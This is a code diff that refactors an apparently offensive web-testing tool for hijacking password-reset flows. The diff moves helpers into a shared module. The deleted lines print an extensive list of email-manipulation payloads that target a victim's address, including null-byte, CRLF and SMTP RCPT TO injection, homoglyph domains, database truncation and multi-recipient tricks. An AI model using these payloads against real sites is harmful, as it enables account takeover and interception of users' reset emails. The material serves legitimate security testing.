@@ -14,7 +14,10 @@ from utils.utils import (
     get_domain_from_url,
     json,
     EMAIL_REGEX,
-    human_time
+    human_time,
+    detect_content_type,
+    build_email_hijack_payloads,
+    EMAIL_ALT_PARAMS,
 )
 import urllib.parse
 import uuid
@@ -167,20 +170,6 @@ def _extract_email_from_body(body):
     return match.group(0) if match else None
 
 
-def _detect_content_type(headers):
-    """Detect current content type from headers."""
-    for k, v in headers.items():
-        if k.lower() == "content-type":
-            v_lower = v.lower()
-            if "application/json" in v_lower:
-                return "json"
-            if "application/x-www-form-urlencoded" in v_lower:
-                return "form"
-            if "multipart/form-data" in v_lower:
-                return "multipart"
-    return "unknown"
-
-
 def _parse_body_params(body, content_type):
     """
     Extract key-value pairs from body regardless of format.
@@ -298,7 +287,7 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
         print(f"  {Colors.YELLOW}[!] No body to transform{Colors.RESET}")
         return
 
-    current_ct = _detect_content_type(headers)
+    current_ct = detect_content_type(headers)
     params = _parse_body_params(body, current_ct)
     victim_email = _extract_email_from_body(body)
 
@@ -500,78 +489,7 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     victim_parts = victim_email.split("@") if "@" in victim_email else None
 
     if email_parts and victim_parts:
-        attacker_domain = email_parts[1]
-        attacker_local = email_parts[0]
-        v_local = victim_parts[0]
-        v_domain = victim_parts[1]
-
-        email_variations = [
-            # Case / whitespace / encoding
-            victim_email.upper(),
-            victim_email[0].upper() + victim_email[1:],
-            f" {victim_email}",
-            f"{victim_email} ",
-            f"{victim_email}\t",
-            f"{victim_email}%00",
-            f"{victim_email}\x00",
-            f"{v_local}+anything@{v_domain}",
-            f"{v_local[0]}.{v_local[1:]}@{v_domain}",
-            victim_email.replace("a", "\u0430", 1),
-
-            # Quoted local part / RFC comments
-            f'"{victim_email}"@{attacker_domain}',
-            f'"{v_local}"@{v_domain}@{attacker_domain}',
-            f"{v_local}@{v_domain}({attacker_domain})",
-            f"({attacker_domain}){v_local}@{v_domain}",
-
-            # Multiple @
-            f"{v_local}@{attacker_domain}@{v_domain}",
-            f"{v_local}@{v_domain}@{attacker_domain}",
-
-            # Percent hack
-            f"{v_local}%{v_domain}@{attacker_domain}",
-            f"{v_local}%{attacker_domain}@{v_domain}",
-
-            # Null byte / CRLF + attacker domain
-            f"{victim_email}%00@{attacker_domain}",
-            f"{victim_email}%0d%0a@{attacker_domain}",
-
-            # DB truncation
-            f"{v_local}{'a' * max(0, 252 - len(victim_email))}@{attacker_domain}",
-            f"{v_local}{'a' * max(0, 61 - len(v_local))}@{attacker_domain}",
-
-            # Double encoding / fullwidth @
-            f"{v_local}%2540{v_domain}",
-            f"{v_local}%40{v_domain}",
-            victim_email.replace("@", "\uFE6B"),
-            victim_email.replace("@", "\uFF20"),
-
-            # Space as multi-recipient separator
-            f"{victim_email} {email}",
-            f"{email} {victim_email}",
-
-            # SMTP RCPT TO injection
-            f"{victim_email}%0d%0aRCPT TO:<{email}>",
-            f"{victim_email}\r\nRCPT TO:<{email}>",
-        ]
-
-        # IDN homoglyph domain (conditional)
-        for char_l, char_c in [("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E")]:
-            if char_l in v_domain:
-                email_variations.append(f"{v_local}@{v_domain.replace(char_l, char_c, 1)}")
-
-        # Unicode dots in domain (conditional)
-        if "." in v_domain:
-            parts = v_domain.split(".")
-            email_variations.append(f"{v_local}@{chr(0x3002).join(parts)}")
-            email_variations.append(f"{v_local}@{chr(0xFF0E).join(parts)}")
-
-        # Gmail specific (conditional)
-        if "gmail" in v_domain.lower():
-            email_variations.append(".".join(v_local) + f"@{v_domain}")
-            email_variations.append(f"{v_local}@googlemail.com")
-        elif "googlemail" in v_domain.lower():
-            email_variations.append(f"{v_local}@gmail.com")
+        email_variations = build_email_hijack_payloads(victim_email, email)
 
         for varied_email in email_variations:
             if current_ct == "json":
@@ -592,9 +510,7 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
 
     # ─── 6b. Alternative email param names (extra params) ────────────────────
     if email_parts:
-        alt_params = ["Email", "mail", "username", "login", "emailAddress",
-                      "e-mail", "user_email", "to", "recipient"]
-        for alt_name in alt_params:
+        for alt_name in EMAIL_ALT_PARAMS:
             if alt_name.lower() == param_mail.lower():
                 continue
             if current_ct == "json":
